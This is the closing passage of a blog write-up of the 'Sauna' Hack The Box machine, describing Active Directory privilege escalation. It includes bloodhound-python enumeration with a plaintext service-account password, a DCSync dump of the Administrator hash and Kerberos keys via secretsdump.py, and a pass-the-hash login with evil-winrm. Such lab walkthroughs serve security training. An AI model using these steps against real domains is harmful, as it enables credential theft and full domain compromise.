<span class=line></span></code></pre><h3 id=get-administrator>Get Administrator<a href=#get-administrator class=anchor><span class=anchor-icon data-pagefind-ignore="">#</span></a></h3><p>With these credentials, we can run a tool called Bloodhound. It is a tool that finds hidden relationships within Active Directory. It can often lead to some quick privilege escalation. There is a python and impacket version of it that I’ll be using for Sauna.</p><p>installing is very easy.</p><pre class="astro-code github-dark" data-language=bash style=background-color:#24292e;color:#e1e4e8;overflow-x:auto tabindex=0><code><span class=line><span style=color:#b392f0>sudo</span><span style=color:#9ecbff> pip</span><span style=color:#9ecbff> install</span><span style=color:#9ecbff> bloodhound</span></span>
<span class=line></span></code></pre><p>Then we can run the command:</p><pre class="astro-code github-dark" data-language=bash style=background-color:#24292e;color:#e1e4e8;overflow-x:auto tabindex=0><code><span class=line><span style=color:#f97583>></span><span style=color:#e1e4e8> bloodhound-python -u svc_loanmgr -p Moneymakestheworldgoround</span><span style=color:#f97583>!</span><span style=color:#b392f0> -d</span><span style=color:#9ecbff> EGOTISTICAL-BANK.LOCAL</span><span style=color:#79b8ff> -ns</span><span style=color:#79b8ff> 10.10.10.175</span><span style=color:#79b8ff> -c</span><span style=color:#9ecbff> All</span></span>
<span class=line></span></code></pre><p>To start the attack. it created a lot .json files that that we will import into bloodhound.</p><pre class="astro-code github-dark" data-language=bash style=background-color:#24292e;color:#e1e4e8;overflow-x:auto tabindex=0><code><span class=line><span style=color:#f97583>></span><span style=color:#e1e4e8> ls</span></span>
<span class=line><span style=color:#b392f0>20240218112738_computers.json</span><span style=color:#9ecbff>    20240218112738_domains.json</span><span style=color:#9ecbff>   20240218112738_groups.json</span><span style=color:#9ecbff>   20240218112738_users.json</span></span>
<span class=line><span style=color:#b392f0>20240218112738_containers.json</span><span style=color:#9ecbff>   20240218112738_gpos.json</span><span style=color:#9ecbff>      20240218112738_ous.json</span></span>
<span class=line></span></code></pre><p>to start the bloodhound console i ran neo4j console then bloodhound in the console. Next, we will upload our files by clicking the upload button on the right.</p><p><img alt=img decoding=async height=336 loading=lazy src=/_astro/3.DRhi2Ilm_1MdoFp.webp width=163></p><p>After importing our files we can select “Find Principals with DCSync Rights” and it generates a graph. Our service account has two permissions. Notice its similar permissions of administrators.</p><ul><li>GetChanges</li><li>GetChangesAll</li></ul><p><img alt=img decoding=async height=750 loading=lazy src=/_astro/4.BTo6p4TH_2vQbKY.webp width=1538></p><p>I right-clicked the relation and selected “Help”. Under the Abuse info,m I learned that we can perform a dcsync attack to get password hashes.</p><p><img alt=img decoding=async height=335 loading=lazy src=/_astro/5.4IxlbuEf_Z13EpTt.webp width=590></p><p>Impacket has a tool called secretsdump.py we can use to leverage this.</p><pre class="astro-code github-dark" data-language=plaintext style=background-color:#24292e;color:#e1e4e8;overflow-x:auto tabindex=0><code><span class=line><span>python3 secretsdump.py egotistical-bank/svc_loanmgr@10.10.10.175 -just-dc-user Administrator </span></span>
<span class=line><span>Impacket v0.11.0 - Copyright 2023 Fortra</span></span>
<span class=line><span></span></span>
<span class=line><span>Password:</span></span>
<span class=line><span>[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)</span></span>
<span class=line><span>[*] Using the DRSUAPI method to get NTDS.DIT secrets</span></span>
<span class=line><span>Administrator:500:aad3b435b51404eeaad3b435b51404ee:823452073d75b9d1cf70ebdf86c7f98e:::</span></span>
<span class=line><span>[*] Kerberos keys grabbed</span></span>
<span class=line><span>Administrator:aes256-cts-hmac-sha1-96:42ee4a7abee32410f470fed37ae9660535ac56eeb73928ec783b015d623fc657</span></span>
<span class=line><span>Administrator:aes128-cts-hmac-sha1-96:a9f3769c592a8a231c3c972c4050be4e</span></span>
<span class=line><span>Administrator:des-cbc-md5:fb8f321c64cea87f</span></span>
<span class=line><span></span></span></code></pre><p>Now we have the admins Hash. We can use it in a pass the hash attack.</p><pre class="astro-code github-dark" data-language=plaintext style=background-color:#24292e;color:#e1e4e8;overflow-x:auto tabindex=0><code><span class=line><span>> evil-winrm -u Administrator -i 10.10.10.175 -H 823452073d75b9d1cf70ebdf86c7f98e</span></span>
<span class=line><span></span></span></code></pre><p>we are administrator.</p></div><div class="transition overflow-hidden bg-[var(--license-block-bg)] license-container mb-6 onload-animation px-6 py-5 relative rounded-xl"><div class="transition font-bold dark:text-white/75 text-black/75">Sauna HTB Writeup</div><a href=https://fuwari.vercel.app/posts/sauna/ class="text-[var(--primary)] link">https://fuwari.vercel.app/posts/sauna/</a><div class="flex gap-6 mt-2"><div><div class="transition text-sm dark:text-white/30 text-black/30">Author</div><div class="transition whitespace-nowrap dark:text-white/75 text-black/75">Mil4ne</div></div><div><div class="transition text-sm dark:text-white/30 text-black/30">Published at</div><div class="transition whitespace-nowrap dark:text-white/75 text-black/75">2024-04-01</div></div><div><div class="transition text-sm dark:text-white/30 text-black/30">License</div><a href=https://creativecommons.org/licenses/by-nc-sa/4.0/ class="text-[var(--primary)] link whitespace-nowrap" target=_blank>CC BY-NC-SA 4.0</a></div></div><svg data-icon=fa6-brands:creative-commons height=240 viewBox="0 0 496 512" width=240 class="transition absolute pointer-events-none -translate-y-1/2 dark:text-white/5 right-6 text-black/5 top-1/2"><symbol id=ai:fa6-brands:creative-commons><path d="m245.83 214.87l-33.22 17.28c-9.43-19.58-25.24-19.93-27.46-19.93c-22.13 0-33.22 14.61-33.22 43.84c0 23.57 9.21 43.84 33.22 43.84c14.47 0 24.65-7.09 30.57-21.26l30.55 15.5c-6.17 11.51-25.69 38.98-65.1 38.98c-22.6 0-73.96-10.32-73.96-77.05c0-58.69 43-77.06 72.63-77.06c30.72-.01 52.7 11.95 65.99 35.86m143.05 0l-32.78 17.28c-9.5-19.77-25.72-19.93-27.9-19.93c-22.14 0-33.22 14.61-33.22 43.84c0 23.55 9.23 43.84 33.22 43.84c14.45 0 24.65-7.09 30.54-21.26l31 15.5c-2.1 3.75-21.39 38.98-65.09 38.98c-22.69 0-73.96-9.87-73.96-77.05c0-58.67 42.97-77.06 72.63-77.06c30.71-.01 52.58 11.95 65.56 35.86M247.56 8.05C104.74 8.05 0 123.11 0 256.05c0 138.49 113.6 248 247.56 248c129.93 0 248.44-100.87 248.44-248c0-137.87-106.62-248-248.44-248m.87 450.81c-112.54 0-203.7-93.04-203.7-202.81c0-105.42 85.43-203.27 203.72-203.27c112.53 0 202.82 89.46 202.82 203.26c-.01 121.69-99.68 202.82-202.84 202.82" fill=currentColor /></symbol><use xlink:href=#ai:fa6-brands:creative-commons></use></svg></div></div></div><div class="flex w-full gap-4 flex-col mb-4 justify-between md:flex-row overflow-hidden"><a href=/posts/sau/ class="w-full active:scale-95 font-bold overflow-hidden"><div class="flex items-center w-full justify-start btn-card gap-4 h-[3.75rem] max-w-full px-4 rounded-2xl"><svg data-icon=material-symbols:chevron-left-rounded height=32 viewBox="0 0 24 24" width=32 class=text-[var(--primary)]><symbol id=ai:material-symbols:chevron-left-rounded><path d="m10.8 12l3.9 3.9q.275.275.275.7t-.275.7t-.7.275t-.7-.275l-4.6-4.6q-.15-.15-.212-.325T8.425 12t.063-.375t.212-.325l4.6-4.6q.275-.275.7-.275t.7.275t.275.7t-.275.7z" fill=currentColor /></symbol><use xlink:href=#ai:material-symbols:chevron-left-rounded></use></svg><div class="transition whitespace-nowrap dark:text-white/75 text-black/75 max-w-[calc(100%_-_3rem)] overflow-ellipsis overflow-hidden">Sau HTB Writeup</div></div></a><a href=/posts/soccer/ class="w-full active:scale-95 font-bold overflow-hidden"><div class="flex items-center w-full btn-card gap-4 h-[3.75rem] max-w-full px-4 rounded-2xl justify-end"><div class="transition whitespace-nowrap dark:text-white/75 text-black/75 max-w-[calc(100%_-_3rem)] overflow-ellipsis overflow-hidden">Soccer HTB Writeup</div><svg data-icon=material-symbols:chevron-right-rounded height=32 viewBox="0 0 24 24" width=32 class=text-[var(--primary)]><symbol id=ai:material-symbols:chevron-right-rounded><path d="M12.6 12L8.7 8.1q-.275-.275-.275-.7t.275-.7t.7-.275t.7.275l4.6 4.6q.15.15.213.325t.062.375t-.062.375t-.213.325l-4.6 4.6q-.275.275-.7.275t-.7-.275t-.275-.7t.275-.7z" fill=currentColor /></symbol><use xlink:href=#ai:material-symbols:chevron-right-rounded></use></svg></div></a></div></main></div><div class="onload-animation col-span-2 grid-rows-3 mt-4" id=footer><div class="flex items-center card-base max-w-[var(--page-width)] mx-auto min-h-[4.5rem] px-6 rounded-b-none"><div class="transition text-sm text-50">© 2024 Mil4ne. All Rights Reserved.<br>Powered by <a href=https://github.com/mil4ne class="text-[var(--primary)] link font-medium" target=_blank>Mil4ne</a></div></div></div><div class="hidden lg:block back-to-top-wrapper" data-astro-cid-5w2ap42j><div class="transition flex items-center back-to-top-btn hide overflow-hidden rounded-2xl" id=back-to-top-btn data-astro-cid-5w2ap42j onclick=backToTop()><button class="w-[3.75rem] btn-card h-[3.75rem]" aria-label="Back to Top" data-astro-cid-5w2ap42j><svg data-icon=material-symbols:keyboard-arrow-up-rounded height=1em viewBox="0 0 24 24" width=1em class=mx-auto data-astro-cid-5w2ap42j><symbol id=ai:material-symbols:keyboard-arrow-up-rounded><path d="m12 10.8l-3.9 3.9q-.275.275-.7.275t-.7-.275t-.275-.7t.275-.7l4.6-4.6q.3-.3.7-.3t.7.3l4.6 4.6q.275.275.275.7t-.275.7t-.7.275t-.7-.275z" fill=currentColor /></symbol><use xlink:href=#ai:material-symbols:keyboard-arrow-up-rounded></use></svg></button></div></div><script>function backToTop(){window.scroll({top:0,behavior:"smooth"})}function scrollFunction(){let o=document.getElementById("back-to-top-btn");document.body.scrollTop>600||document.documentElement.scrollTop>600?o.classList.remove("hide"):o.classList.add("hide")}window.onscroll=scrollFunction</script></div></div></body></html>